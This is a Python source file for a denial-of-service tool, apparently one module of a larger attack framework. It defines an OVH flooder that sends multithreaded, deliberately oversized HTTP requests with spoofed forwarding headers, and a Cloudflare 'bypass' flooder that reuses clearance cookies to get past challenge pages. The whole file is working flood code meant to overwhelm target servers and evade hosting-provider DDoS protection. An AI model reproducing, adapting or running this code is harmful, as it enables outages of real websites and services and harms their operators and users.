import random
import socket
import threading
import time
import os
import logging
import struct
from typing import List, Dict, Optional
from .utilities import AttackModule, UI, Style

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

class OVHFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, proxy_manager=None, 
                 skip_prompt: bool = False, path: str = '/'):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        self.path = path
        
        # Initialize stats
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }
        self.stats_lock = threading.Lock()
        
        # Initialize logger
        self.logger = logging.getLogger(__name__)
        if debug:
            self.logger.setLevel(logging.DEBUG)
        else:
            self.logger.setLevel(logging.INFO)

        # Initialize user agents list first
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.112',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Vivaldi/4.1',
            'Mozilla/5.0 (Android 11; Mobile; rv:90.0) Gecko/90.0 Firefox/90.0',
            'Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:90.0) Gecko/90.0 Firefox/90.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
        ]
        
        # OVH specific settings
        self.packet_size = 65500  # Maximum UDP packet size
        self.timeout = 3
        self.max_retries = 5
        self.connection_pool_size = 500
        self.keepalive = True
        self.verify_ssl = False
        
        # Adaptive packet sizing
        self.adaptive_sizing = True
        self.initial_packet_size = 8192
        self.max_packet_size = 65500
        self.min_packet_size = 1024
        self.packet_size_step = 2048
        self.target_success_rate = 0.85
        
        # Connection management
        self.connection_backoff = {
            "initial": 0.1,
            "max": 2.0,
            "factor": 1.5
        }
        
        # Port-specific optimizations
        self.port_settings = {
            22: {  # SSH port
                "max_packet_size": 4096,
                "timeout": 1.5,
                "connection_delay": 0.05
            },
            80: {  # HTTP
                "max_packet_size": 65500,
                "timeout": 3.0,
                "connection_delay": 0.001
            },
            443: {  # HTTPS
                "max_packet_size": 65500,
                "timeout": 3.0,
                "connection_delay": 0.001
            }
        }

        # Target-specific adaptive settings
        self.target_settings = {}
        for target in targets:
            for port in ports:
                key = f"{target}:{port}"
                self.target_settings[key] = {
                    "current_packet_size": self.initial_packet_size,
                    "success_rate": 0.0,
                    "backoff_time": self.connection_backoff["initial"],
                    "consecutive_failures": 0,
                    "consecutive_successes": 0
                }
        
        # HTTP headers to bypass OVH protection
        self.headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': self._generate_random_ip(),
            'X-Forwarded-Host': random.choice(self.targets),
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': self._get_random_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # Increase packet size with larger data
        self.query_params = {
            'id': 'X' * 16384,        # Increased from 4096
            'data': 'X' * 16384,      # Increased from 4096
            'token': 'X' * 16384,     # Increased from 4096
            'payload': 'X' * 16384,   # New parameter
            'buffer': 'X' * 16384,    # New parameter
            'stream': 'X' * 16384     # New parameter
        }
        
        # Add more headers to increase packet size
        self.headers.update({
            'X-Large-Payload': 'X' * 4096,
            'X-Custom-Data': 'X' * 4096,
            'X-Buffer-Size': 'X' * 4096,
            'X-Request-ID': lambda: str(random.randint(10000000, 99999999)),
            'X-Timestamp': lambda: str(int(time.time() * 1000)),
        })
        
        # Performance monitoring
        self._monitor_thread = None
        self.perf_data = {
            "last_time": time.time(),
            "current_rps": 0,
            "highest_rps": 0,
            "total_requests": 0,
            "total_bytes": 0
        }
        
        # Socket pools for better resource management
        self.socket_pools = []
        self.socket_pool_locks = []
        for _ in range(min(threads, 32)):  # Limit to 32 pools max
            self.socket_pools.append({})
            self.socket_pool_locks.append(threading.Lock())
    
    def increment_stat(self, stat_name: str, value: int = 1):
        """Thread-safe increment of stats"""
        with self.stats_lock:
            self.stats[stat_name] += value
    
    def _get_random_user_agent(self) -> str:
        """Return a random user agent from the list"""
        return random.choice(self.user_agents)
    
    def _generate_random_ip(self) -> str:
        """Generate a random IP address for X-Forwarded-For header"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    def _get_port_settings(self, port: int) -> dict:
        """Get settings optimized for the specific port"""
        return self.port_settings.get(port, {
            "max_packet_size": self.max_packet_size,
            "timeout": self.timeout,
            "connection_delay": 0.001
        })
    
    def _adjust_target_settings(self, target: str, port: int, success: bool):
        """Dynamically adjust settings based on success/failure"""
        key = f"{target}:{port}"
        settings = self.target_settings[key]
        
        if success:
            settings["consecutive_successes"] += 1
            settings["consecutive_failures"] = 0
            settings["success_rate"] = min(1.0, settings["success_rate"] + 0.05)
            
            if self.adaptive_sizing and settings["success_rate"] > self.target_success_rate:
                settings["current_packet_size"] = min(
                    settings["current_packet_size"] + self.packet_size_step,
                    self._get_port_settings(port)["max_packet_size"]
                )
        else:
            settings["consecutive_failures"] += 1
            settings["consecutive_successes"] = 0
            settings["success_rate"] = max(0.0, settings["success_rate"] - 0.05)
            
            if self.adaptive_sizing:
                settings["current_packet_size"] = max(
                    settings["current_packet_size"] - self.packet_size_step,
                    self.min_packet_size
                )
            
            settings["backoff_time"] = min(
                settings["backoff_time"] * self.connection_backoff["factor"],
                self.connection_backoff["max"]
            )
    
    def _create_http_request(self, target: str, port: int) -> bytes:
        """Create an HTTP request optimized for OVH bypass with adaptive payload size"""
        headers = self.headers.copy()
        headers['User-Agent'] = self._get_random_user_agent()
        headers['X-Forwarded-For'] = self._generate_random_ip()
        
        for key, value in headers.items():
            if callable(value):
                headers[key] = value()
        
        params = self.query_params.copy()
        params.update({
            '_': int(time.time() * 1000),
            'rand': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16)),
            'seq': str(random.randint(1000000, 9999999))
        })
        
        param_items = list(params.items())
        random.shuffle(param_items)
        query_string = "&".join([f"{k}={v}" for k, v in param_items])
        
        request_path = f"{self.path}?{query_string}"
        
        header_items = list(headers.items())
        random.shuffle(header_items)
        
        request_lines = [
            f"GET {request_path} HTTP/1.1",
            f"Host: {target}"
        ]
        
        request_lines.extend([f"{header}: {value}" for header, value in header_items])
        
        for i in range(5):
            request_lines.append(f"X-Random-{i}: {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=1024))}")
        
        request_lines.append("\r\n")
        
        return "\r\n".join(request_lines).encode()
    
    def flood_worker(self, target: str, port: int, thread_id: int = 0):
        """Worker thread for OVH flooding with improved connection handling"""
        self.logger.debug(f"Starting OVH flood worker {thread_id} for {target}:{port}")
        
        key = f"{target}:{port}"
        settings = self.target_settings[key]
        port_settings = self._get_port_settings(port)
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(port_settings["timeout"])
                
                sock.connect((target, port))
                
                for _ in range(3):
                    request = self._create_http_request(target, port)
                    sock.send(request)
                    
                    self.increment_stat("packets_sent")
                    self.increment_stat("bytes_sent", len(request))
                    self.increment_stat("successful")
                    
                    self._adjust_target_settings(target, port, success=True)
                
                time.sleep(port_settings["connection_delay"])
            
            except (socket.error, OSError) as e:
                self.increment_stat("failures")
                self._adjust_target_settings(target, port, success=False)
                
                if self.debug:
                    self.logger.debug(f"Connection error in worker {thread_id}: {e}")
                
                time.sleep(settings["backoff_time"])
            
            finally:
                try:
                    sock.close()
                except:
                    pass
    
    def monitor_performance(self):
        """Monitor and display performance metrics with adaptive optimization"""
        last_update = time.time()
        last_stats = self.stats.copy()
        
        while self.running:
            try:
                time.sleep(1.0)
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats.copy()
                    
                    rps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    if rps > self.perf_data["highest_rps"]:
                        self.perf_data["highest_rps"] = rps
                    
                    self.perf_data["current_rps"] = rps
                    
                    total_attempts = current_stats["successful"] + current_stats["failures"]
                    success_rate = int((current_stats["successful"] / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_line = f"[{timestamp}] Target: {self.targets[0]} | Port: {self.ports[0]} | Method: OVH | RPS: {rps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
                    
                    print(status_line)
                    
                    last_stats = current_stats.copy()
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)
    
    def _print_final_stats(self):
        """Print final statistics with target-specific details"""
        elapsed = time.time() - self.start_time
        rps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        mbps = (self.stats["bytes_sent"] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total requests sent: {self.stats['packets_sent']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Failed requests: {self.stats['failures']:,}")
        print(f"- Average speed: {rps:.0f} requests/sec ({mbps:.2f} Mbps)")
        print(f"- Peak performance: {self.perf_data['highest_rps']:.0f} requests/sec")
        
        for key, settings in self.target_settings.items():
            print(f"- Target {key}: Success Rate: {settings['success_rate']:.2f}, Packet Size: {settings['current_packet_size']}")
    
    def start(self):
        """Start the OVH flood operation with adaptive features"""
        super().start()
        
        UI.print_header("OVH Flood Operation")
        UI.print_info(f"Starting OVH flood against {len(self.targets)} targets on {len(self.ports)} ports")
        
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Threads per target/port: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Path: {self.path}")
        
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for t in range(self.threads):
                    thread = threading.Thread(
                        target=self.flood_worker, 
                        args=(target, port, thread_count)
                    )
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                           prefix=f"Threads: {thread_count}/{total_threads}",
                                           length=30)
        
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = True
        self._monitor_thread.start()
        
        try:
            UI.print_info(f"Operation running for {self.duration} seconds (Press Ctrl+C to stop)")
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()
    
    def stop(self):
        """Stop the OVH flood operation gracefully"""
        if not self.running:
            return
            
        UI.print_info("Stopping OVH flood operation...")
        
        self.running = False
        
        if self._monitor_thread and self._monitor_thread.is_alive():
            try:
                self._monitor_thread.join(timeout=1)
            except Exception as e:
                if self.debug:
                    self.logger.debug(f"Error stopping monitor thread: {e}")
        
        for thread in self.thread_list:
            try:
                thread.join(timeout=0.5)
            except Exception as e:
                if self.debug:
                    self.logger.debug(f"Error stopping thread: {e}")
        
        for pool in self.socket_pools:
            for key, sock in pool.items():
                try:
                    sock.close()
                except:
                    pass
            pool.clear()
        
        self._print_final_stats()
        
        UI.print_success("OVH flood operation stopped successfully")


class CloudflareBypass(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, proxy_manager=None, 
                 skip_prompt: bool = False, path: str = '/'):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        self.path = path
        
        # Initialize stats
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }
        self.stats_lock = threading.Lock()
        
        # Initialize logger
        self.logger = logging.getLogger(__name__)
        if debug:
            self.logger.setLevel(logging.DEBUG)
        else:
            self.logger.setLevel(logging.INFO)

        # Cloudflare bypass settings
        self.timeout = 5
        self.max_retries = 3
        self.connection_pool_size = 200
        self.verify_ssl = False
        
        # Headers to bypass Cloudflare
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
            'DNT': '1'
        }
        
        # Performance monitoring
        self._monitor_thread = None
        self.perf_data = {
            "last_time": time.time(),
            "current_rps": 0,
            "highest_rps": 0,
            "total_requests": 0,
            "total_bytes": 0
        }
        
        # User agents list for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59'
        ]

        if debug:
            self.logger.setLevel(logging.DEBUG)
    
    def increment_stat(self, stat_name: str, value: int = 1):
        """Thread-safe increment of stats"""
        with self.stats_lock:
            self.stats[stat_name] += value
    
    def flood_worker(self, target: str, port: int):
        """Worker thread for Cloudflare bypass flooding"""
        import requests
        from requests.exceptions import RequestException
        
        # Setup session with optimized settings
        session = requests.Session()
        session.verify = self.verify_ssl
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.connection_pool_size,
            pool_maxsize=self.connection_pool_size,
            max_retries=self.max_retries,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Determine protocol
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{target}:{port}{self.path}"
        
        # Track cookies for Cloudflare bypass
        cf_cookies = {}
        
        while self.running:
            try:
                # Rotate user agent
                headers = self.headers.copy()
                headers['User-Agent'] = random.choice(self.user_agents)
                
                # Add timestamp to prevent caching
                params = {'_': int(time.time() * 1000)}
                
                # First request to get Cloudflare cookies
                response = session.get(
                    base_url,
                    headers=headers,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Store Cloudflare cookies
                if 'cf_clearance' in session.cookies:
                    cf_cookies = session.cookies.get_dict()
                
                # Calculate total bytes sent
                sent_bytes = len(str(headers)) + len(str(params))
                
                # Update stats
                self.increment_stat("successful")
                self.increment_stat("packets_sent")
                self.increment_stat("bytes_sent", sent_bytes + len(response.content))
                
                # If we got a Cloudflare challenge page, try to solve it
                if 'cf-browser-verification' in response.text or 'cf_chl_prog' in response.text:
                    # Wait a bit to simulate solving the challenge
                    time.sleep(random.uniform(3, 5))
                    
                    # Make a second request with the cookies
                    response = session.get(
                        base_url,
                        headers=headers,
                        params=params,
                        cookies=cf_cookies,
                        timeout=self.timeout,
                        allow_redirects=True
                    )
                    
                    # Update stats for second request
                    self.increment_stat("successful")
                    self.increment_stat("packets_sent")
                    self.increment_stat("bytes_sent", sent_bytes + len(response.content))
                
            except RequestException as e:
                self.increment_stat("failures")
                if self.debug:
                    self.logger.debug(f"Request failed: {str(e)}")
                time.sleep(0.5)
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Unexpected error: {str(e)}")
                time.sleep(0.5)
    
    def start(self):
        """Start Cloudflare bypass flood operation"""
        super().start()
        
        # Import check
        try:
            import requests
        except ImportError:
            UI.print_error("Please install required package: pip install requests")
            return
        
        UI.print_header("Cloudflare Bypass Flood Operation")
        UI.print_info(f"Starting Cloudflare bypass flood against {len(self.targets)} targets")
        
        # Configuration display
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Path: {self.path}")
        print(f"- Threads per target: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Connection pool size: {self.connection_pool_size}")
        
        # Launch worker threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_worker, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                         prefix=f"Threads: {thread_count}/{total_threads}",
                                         length=30)
        
        # Start performance monitoring
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = False
        self._monitor_thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()
    
    def monitor_performance(self):
        """Monitor and display performance metrics"""
        last_update = time.time()
        last_stats = self.stats.copy()
        
        while self.running:
            try:
                time.sleep(1.0)
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats.copy()
                    
                    # Calculate rates
                    rps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    # Update peak metrics
                    if rps > self.perf_data["highest_rps"]:
                        self.perf_data["highest_rps"] = rps
                    
                    # Update current metrics
                    self.perf_data["current_rps"] = rps
                    
                    # Calculate success rate
                    total_attempts = current_stats["successful"] + current_stats["failures"]
                    success_rate = int((current_stats["successful"] / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    # Format status line
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_line = f"[{timestamp}] Target: {self.targets[0]} | Port: {self.ports[0]} | Method: CLOUDFLARE | RPS: {rps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
                    
                    # Print status
                    print(status_line)
                    
                    # Update tracking values
                    last_stats = current_stats.copy()
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)
    
    def stop(self):
        """Stop the Cloudflare bypass operation gracefully"""
        if not self.running:
            return
            
        self.running = False
        
        # Stop the monitor thread
        if self._monitor_thread and self._monitor_thread.is_alive():
            try:
                self._monitor_thread.join(timeout=2)
            except Exception:
                pass

        # Cleanup all threads
        for thread in self.thread_list:
            try:
                if thread.is_alive():
                    thread.join(timeout=1)
            except Exception:
                pass

        # Print final summary
        elapsed = time.time() - self.start_time
        rps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        mbps = (self.stats["bytes_sent"] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total requests: {self.stats['packets_sent']:,}")
        print(f"- Failed requests: {self.stats['failures']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Average speed: {rps:.0f} requests/sec ({mbps:.2f} Mbps)")
        print(f"- Peak performance: {self.perf_data['highest_rps']:.0f} requests/sec")
        
        UI.print_success("Cloudflare bypass operation stopped successfully")


def get_default_ports(method: str) -> List[int]:
    """Get default ports based on attack method"""
    default_ports = {
        'udp': [53],         # Default DNS port for UDP flood
        'syn': [80, 443],    # Common web ports for SYN flood
        'http': [80, 443],   # Standard HTTP/HTTPS ports
        'ovh': [80, 443],    # Add default ports for OVH
        'cloudflare': [80, 443],  # Add default ports for Cloudflare
        'minecraft': [25565]  # Default Minecraft server port
    }
    return default_ports.get(method, [80])  # Default to port 80 if method not found